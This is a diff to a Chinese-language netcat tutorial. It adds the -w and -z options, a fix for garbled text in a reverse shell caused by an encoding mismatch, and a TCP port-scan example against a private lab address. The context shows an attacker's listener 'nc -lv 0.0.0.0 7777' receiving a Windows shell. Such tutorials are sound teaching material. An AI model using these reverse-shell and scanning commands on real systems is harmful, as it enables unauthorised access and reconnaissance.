@@ -20,6 +20,10 @@ nc [参数] 主机 端口
 
 -v 让nc提供更多的信息
 
+-w 秒数 指定超时时间
+
+-z 只进行端口扫描，不发送数据。欲查看是否开放端口需要使用-v参数
+
 
 
 ### 例子
@@ -67,6 +71,8 @@ re
 
 创建连接后，攻击者就会收到一个shell
 
+由于两个系统使用的编码不同，所以有乱码。解决的办法是修改Linux的terminal的编码为GBK
+
 ```
 $ nc -lv 0.0.0.0 7777
 Listening on [0.0.0.0] (family 0, port 7777)
@@ -99,6 +105,24 @@ dir
 
 C:\workspace\download\netcat-mingw>
 
+```
+
+
+
+#### 端口扫描
+
+对某个主机进行tcp端口扫描
+
+```shell
+$ nc -zvw 2 192.168.247.24 22-200
+Connection to 192.168.247.24 22 port [tcp/ssh] succeeded!
+nc: connect to 192.168.247.24 port 23 (tcp) timed out: Operation now in progress
+nc: connect to 192.168.247.24 port 24 (tcp) timed out: Operation now in progress
+nc: connect to 192.168.247.24 port 25 (tcp) timed out: Operation now in progress
+nc: connect to 192.168.247.24 port 26 (tcp) timed out: Operation now in progress
+nc: connect to 192.168.247.24 port 27 (tcp) timed out: Operation now in progress
+nc: connect to 192.168.247.24 port 28 (tcp) timed out: Operation now in progress
+nc: connect to 192.168.247.24 port 29 (tcp) timed out: Operation now in progress
 ```
 
 
